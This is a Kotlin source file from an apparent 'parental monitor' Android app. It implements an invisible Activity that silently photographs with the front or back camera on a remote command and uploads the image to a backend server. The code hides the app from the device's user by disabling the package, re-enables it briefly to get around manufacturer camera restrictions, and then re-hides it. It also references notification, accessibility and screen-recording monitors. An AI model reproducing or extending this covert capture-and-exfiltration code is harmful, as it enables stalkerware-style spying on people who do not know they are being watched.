package com.parentalmonitor.child.activities

import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.app.Activity
import android.content.ComponentName
import android.content.pm.PackageManager
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Zero-UI transparent Activity used solely for camera capture.
 *
 * Why an Activity instead of calling Camera2 from the ForegroundService:
 *   - On Vivo / Xiaomi / OPPO / Samsung devices, Camera2 from a background Service
 *     is blocked by OEM camera policies (ERROR_CAMERA_DISABLED).
 *   - Samsung's camera HAL also checks the package enabled state — when the app is
 *     hidden via setApplicationEnabledSetting(DISABLED), camera returns ERROR_CAMERA_DISABLED
 *     even for component-enabled services. We briefly re-enable the package before
 *     opening the camera, then re-hide it after capture completes.
 */
class CameraCaptureActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // No setContentView — stays fully transparent

        val commandId = intent.getStringExtra(EXTRA_COMMAND_ID) ?: run { finish(); return }
        val token     = intent.getStringExtra(EXTRA_TOKEN)      ?: run { finish(); return }
        val baseUrl   = intent.getStringExtra(EXTRA_BASE_URL)   ?: run { finish(); return }
        val facing    = intent.getStringExtra(EXTRA_FACING)     ?: "back"

        // Package re-enable and media restriction clearing are done by RemoteCommandService
        // BEFORE this Activity is launched (with a 500ms wait). By the time onCreate() runs,
        // the camera policy is already cleared and the package is enabled.
        val wasHidden = intent.getBooleanExtra(EXTRA_WAS_HIDDEN, false)
        android.util.Log.d(TAG, "capture_photo: facing=$facing  wasHidden=$wasHidden")

        Thread {
            val result = capturePhoto(facing)

            if (wasHidden) {
                // Re-hide the app now that capture is done.
                android.util.Log.d(TAG, "Capture done — re-hiding package")
                val pm = packageManager
                pm.setApplicationEnabledSetting(packageName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP)
                backgroundComponents().forEach { cls ->
                    try {
                        pm.setComponentEnabledSetting(
                            ComponentName(this, cls),
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP)
                    } catch (_: Exception) {}
                }
            }

            reportResult(token, commandId, result, baseUrl)
            runOnUiThread { finish() }
        }.start()
    }

    private fun backgroundComponents(): List<Class<*>> = listOf(
        com.parentalmonitor.child.services.TrackingForegroundService::class.java,
        com.parentalmonitor.child.receivers.BootReceiver::class.java,
        com.parentalmonitor.child.listeners.NotificationMonitorService::class.java,
        com.parentalmonitor.child.services.AccessibilityMonitorService::class.java,
        com.parentalmonitor.child.services.ScreenRecordService::class.java,
        com.parentalmonitor.child.activities.ScreenCaptureActivity::class.java,
        com.parentalmonitor.child.activities.CameraCaptureActivity::class.java,
        com.parentalmonitor.child.receivers.DeviceAdminReceiver::class.java,
    )

    // ── Camera2 capture ───────────────────────────────────────────────────────

    @Suppress("MissingPermission")
    private fun capturePhoto(facing: String): String {
        if (checkSelfPermission(android.Manifest.permission.CAMERA)
            != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            return err("camera_permission_not_granted")
        }

        val manager  = getSystemService(CAMERA_SERVICE) as CameraManager
        val wantFront = facing == "front"
        val facingVal = if (wantFront) CameraCharacteristics.LENS_FACING_FRONT
                        else           CameraCharacteristics.LENS_FACING_BACK

        val cameraId = manager.cameraIdList.firstOrNull { id ->
            manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == facingVal
        } ?: manager.cameraIdList.firstOrNull() ?: return err("no_camera_found")

        val chars = manager.getCameraCharacteristics(cameraId)
        val map   = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
        val size  = map?.getOutputSizes(ImageFormat.JPEG)
            ?.filter { it.width <= 1920 }
            ?.maxByOrNull { it.width * it.height }
            ?: android.util.Size(1280, 720)

        val latch  = CountDownLatch(1)
        var result = err("timeout_15s")

        val thread  = HandlerThread("CamCap").also { it.start() }
        val handler = Handler(thread.looper)

        val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
        reader.setOnImageAvailableListener({ r ->
            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val buf   = img.planes[0].buffer
                val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                val b64   = Base64.encodeToString(bytes, Base64.NO_WRAP)
                result = """{"type":"photo","data":"$b64","mimeType":"image/jpeg","width":${size.width},"height":${size.height}}"""
            } finally { img.close(); latch.countDown() }
        }, handler)

        try {
            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    device.createCaptureSession(
                        listOf(reader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                val req = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                    addTarget(reader.surface)
                                    set(CaptureRequest.JPEG_QUALITY, 85.toByte())
                                    set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                    set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
                                }
                                session.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureFailed(s: CameraCaptureSession, r: CaptureRequest, f: CaptureFailure) {
                                        result = err("capture_failed_${f.reason}")
                                        latch.countDown()
                                    }
                                }, handler)
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) {
                                result = err("session_configure_failed")
                                latch.countDown()
                            }
                        }, handler)
                }
                override fun onDisconnected(device: CameraDevice) {
                    device.close(); result = err("camera_disconnected"); latch.countDown()
                }
                override fun onError(device: CameraDevice, error: Int) {
                    device.close(); result = err("camera_error_$error"); latch.countDown()
                }
            }, handler)

            latch.await(20, TimeUnit.SECONDS)
        } catch (e: Exception) {
            result = err(e.message ?: "exception")
        } finally {
            try { reader.close() } catch (_: Exception) {}
            thread.quitSafely()
        }
        return result
    }

    // ── Report result to backend ──────────────────────────────────────────────

    private fun reportResult(token: String, commandId: String, resultJson: String, baseUrl: String) {
        try {
            val escaped = resultJson
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
            val body = """{"status":"completed","result":"$escaped"}""".toByteArray(Charsets.UTF_8)

            val conn = (URL("$baseUrl/api/commands/$commandId/status")
                .openConnection() as HttpURLConnection).apply {
                requestMethod = "PATCH"
                setRequestProperty("Authorization", "Bearer $token")
                setRequestProperty("Content-Type",  "application/json")
                doOutput = true
                connectTimeout = 15_000
                readTimeout    = 60_000
                setFixedLengthStreamingMode(body.size)
            }
            conn.outputStream.use { it.write(body) }
            val code = conn.responseCode
            android.util.Log.d(TAG, "reportResult HTTP $code for $commandId")
            conn.disconnect()
        } catch (e: Exception) {
            android.util.Log.w(TAG, "reportResult failed: ${e.message}")
        }
    }

    private fun err(msg: String) = """{"type":"error","message":"$msg"}"""

    companion object {
        const val TAG              = "CameraCaptureActivity"
        const val EXTRA_COMMAND_ID = "commandId"
        const val EXTRA_TOKEN      = "token"
        const val EXTRA_BASE_URL   = "baseUrl"
        const val EXTRA_FACING     = "facing"
        const val EXTRA_WAS_HIDDEN = "wasHidden"
    }
}
